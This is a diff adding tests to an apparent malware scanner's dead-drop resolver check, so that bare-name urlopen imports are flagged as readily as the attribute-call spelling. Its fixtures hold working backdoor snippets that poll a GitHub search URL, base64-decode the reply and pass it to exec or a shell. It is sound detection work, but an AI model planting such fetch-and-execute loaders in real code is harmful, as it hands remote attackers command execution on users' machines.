@@ -209,6 +209,156 @@ def test_bare_name_shadowed_fetch_does_not_confirm_or_warn():
     assert f.status == PASS
 
 
+# ----------------------------------------------------------------- B-993 round 2
+# C-135 adversarial review of round 1 found its `facts` threading INCOMPLETE: the
+# fetch leg (above) was covered, but the decode leg (`_deaddrop_decode_tainted_names`)
+# and the sink loop's own inline-decode check each run their OWN `_expr_reads_remote`
+# call over a fetch that sits INLINE (no intermediate variable naming the fetch), and
+# neither received `facts`. Consequence: a bare-name fetch nested directly inside a
+# decode expression -- `base64.b64decode(urlopen(u).read())` -- fell back to the
+# ambiguous (WARN) co-occurrence leg instead of the attribute-call spelling's
+# confirmed (crit) FAIL, purely because of which import style was used. Round 2
+# threads the same already-derived `facts` value into both remaining call sites. Each
+# bare-name shape below is paired with its attribute-call control, which was already
+# crit before this round and must remain crit after it.
+
+_BARE_NAME_INLINE_DECODE_ASSIGN_SRC = (
+    "import base64\n"
+    "import subprocess\n"
+    "import time\n"
+    "from urllib.request import urlopen\n"
+    "\n"
+    "_API = \"https://api.github.com/search/commits?q=marker\"\n"
+    "\n"
+    "\n"
+    "def _poll_once():\n"
+    "    payload = base64.b64decode(urlopen(_API, timeout=10).read())\n"
+    "    subprocess.run(payload, shell=True)\n"
+    "\n"
+    "\n"
+    "def main():\n"
+    "    while True:\n"
+    "        _poll_once()\n"
+    "        time.sleep(86400)\n"
+)
+
+
+def test_confirmed_deaddrop_resolver_fails_for_bare_name_inline_decode_assign():
+    # B-993 round 2: the fetch (`urlopen(_API, timeout=10).read()`) sits INLINE as the
+    # decode primitive's own argument -- no intermediate variable names the fetch
+    # separately -- and the decoded value (`payload`) is assigned, then reaches
+    # subprocess.run() directly. Exercises the decode leg's `_expr_reads_remote` call
+    # in `_deaddrop_decode_tainted_names`. Must FAIL, matching the attribute-call
+    # control below.
+    ctx = _ctx_with_py(
+        "inbox-decoder", "scripts/sync_rules.py", _BARE_NAME_INLINE_DECODE_ASSIGN_SRC
+    )
+    f = check_deaddrop_resolver(ctx)
+    assert f.status == FAIL
+    assert any("taint confirmed" in e or "dead-drop" in e for e in [f.detail])
+    assert any("subprocess.run" in e for e in f.evidence)
+
+
+_ATTR_INLINE_DECODE_ASSIGN_SRC = (
+    "import base64\n"
+    "import subprocess\n"
+    "import time\n"
+    "import urllib.request\n"
+    "\n"
+    "_API = \"https://api.github.com/search/commits?q=marker\"\n"
+    "\n"
+    "\n"
+    "def _poll_once():\n"
+    "    payload = base64.b64decode(urllib.request.urlopen(_API, timeout=10).read())\n"
+    "    subprocess.run(payload, shell=True)\n"
+    "\n"
+    "\n"
+    "def main():\n"
+    "    while True:\n"
+    "        _poll_once()\n"
+    "        time.sleep(86400)\n"
+)
+
+
+def test_attribute_form_inline_decode_assign_still_confirms_fail():
+    # Control for the test above: identical composition, attribute-call spelling
+    # (`urllib.request.urlopen`) -- already crit before round 2, must remain crit
+    # after it.
+    ctx = _ctx_with_py(
+        "inbox-decoder-attr", "scripts/sync_rules.py", _ATTR_INLINE_DECODE_ASSIGN_SRC
+    )
+    f = check_deaddrop_resolver(ctx)
+    assert f.status == FAIL
+    assert any("taint confirmed" in e or "dead-drop" in e for e in [f.detail])
+    assert any("subprocess.run" in e for e in f.evidence)
+
+
+_BARE_NAME_INLINE_DECODE_EXEC_SRC = (
+    "import base64\n"
+    "import time\n"
+    "from urllib.request import urlopen\n"
+    "\n"
+    "_API = \"https://api.github.com/search/commits?q=marker\"\n"
+    "\n"
+    "\n"
+    "def _poll_once():\n"
+    "    exec(base64.b64decode(urlopen(_API, timeout=10).read()))\n"
+    "\n"
+    "\n"
+    "def main():\n"
+    "    while True:\n"
+    "        _poll_once()\n"
+    "        time.sleep(86400)\n"
+)
+
+
+def test_confirmed_deaddrop_resolver_fails_for_bare_name_inline_decode_exec():
+    # B-993 round 2: the fetch sits INLINE directly inside the decode call, which
+    # itself sits INLINE directly inside the exec sink's own argument -- no
+    # intermediate variable at all. Exercises the sink loop's own inline-decode check
+    # (`inline_hit` in `_deaddrop_resolver_findings`). Must FAIL, matching the
+    # attribute-call control below.
+    ctx = _ctx_with_py(
+        "inbox-exec-decoder", "scripts/sync_rules.py", _BARE_NAME_INLINE_DECODE_EXEC_SRC
+    )
+    f = check_deaddrop_resolver(ctx)
+    assert f.status == FAIL
+    assert any("taint confirmed" in e or "dead-drop" in e for e in [f.detail])
+    assert any("exec" in e for e in f.evidence)
+
+
+_ATTR_INLINE_DECODE_EXEC_SRC = (
+    "import base64\n"
+    "import time\n"
+    "import urllib.request\n"
+    "\n"
+    "_API = \"https://api.github.com/search/commits?q=marker\"\n"
+    "\n"
+    "\n"
+    "def _poll_once():\n"
+    "    exec(base64.b64decode(urllib.request.urlopen(_API, timeout=10).read()))\n"
+    "\n"
+    "\n"
+    "def main():\n"
+    "    while True:\n"
+    "        _poll_once()\n"
+    "        time.sleep(86400)\n"
+)
+
+
+def test_attribute_form_inline_decode_exec_still_confirms_fail():
+    # Control for the test above: identical composition, attribute-call spelling
+    # (`urllib.request.urlopen`) -- already crit before round 2, must remain crit
+    # after it.
+    ctx = _ctx_with_py(
+        "inbox-exec-decoder-attr", "scripts/sync_rules.py", _ATTR_INLINE_DECODE_EXEC_SRC
+    )
+    f = check_deaddrop_resolver(ctx)
+    assert f.status == FAIL
+    assert any("taint confirmed" in e or "dead-drop" in e for e in [f.detail])
+    assert any("exec" in e for e in f.evidence)
+
+
 _AMBIGUOUS_SRC = (
     "import base64\n"
     "import subprocess\n"
